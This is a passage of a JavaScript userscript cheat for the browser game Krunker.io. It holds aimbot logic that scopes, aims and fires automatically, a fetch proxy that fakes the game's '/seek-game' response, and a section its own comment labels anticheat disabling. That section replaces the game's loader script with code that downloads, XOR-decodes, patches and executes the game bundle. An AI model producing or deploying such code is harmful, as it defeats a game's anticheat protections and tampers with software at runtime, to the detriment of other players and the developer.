            } else if (cheat.state.quickscopeCanShoot) {
                input[key.scope] = 1;
                if (!me[cheat.vars.aimVal] || me.weapon.noAim) {
                    input[key.ydir] = yDire
                    input[key.xdir] = xDire
                    input[key.shoot] = 1;
                }
            }
        }
        if (cheat.settings.alwaysAim) input[key.scope] = 1;
        if (cheat.settings.pitchHack === 1 && input[key.jump] && (me.weapon.name === "Shotgun" || me.weapon.name === "Sawed Off"))  {
            input[key.shoot] = 1
        }
    `+"};$2")
        return gameCode
    }

    window.gameCodeInit = function(script) {
        return setVars(script), patch(script)
    }


    // anticheat disabling stuff

    window.addEventListener("load", () => {
        let itv = setInterval(() => {
            if (window.windows) {
                clearInterval(itv);
                initGUI();
            }
        }, 200);
    })

    window.fetch = new Proxy(fetch, {
        apply(target, thisArg, argArray) {
            if (argArray[0].includes("/seek-game")) {
                return Promise.resolve({
                    json() {
                        return Promise.resolve(wsdata)
                    },
                    status: 200,
                    statusText: "",
                    ok: true,
                })
            }
            return target.apply(thisArg, argArray);
        }
    })

    let observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
            for (let node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT' && node.type === "text/javascript" && node.innerHTML.includes("Yendis Entertainment")) {
                    node.innerHTML = `
                fetch("https://krunker.io/social.html")
                    .then(resp => resp.text())
                    .then(text => fetch("https://krunker.io/pkg/krunker."+/\\w.exports="(\\w+)"/.exec(text)[1]+".vries"))
                    .then(resp => resp.arrayBuffer())
                    .then(buf  => {
                        let vries = new Uint8Array(buf);
                        let xor = vries[0] ^ 33;
                        return new TextDecoder().decode(vries.map(b => b^xor))
                    })
                    .then(gamejs => Function("__LOADER__mmTokenPromise", "/* Loader made by chonker1337 */ "+window.gameCodeInit(gamejs))(Promise.resolve("hello kpal")))
                `
                }
            }
        }
    });
    observer.observe(document, {
        childList: true,
        subtree: true
    });
})();
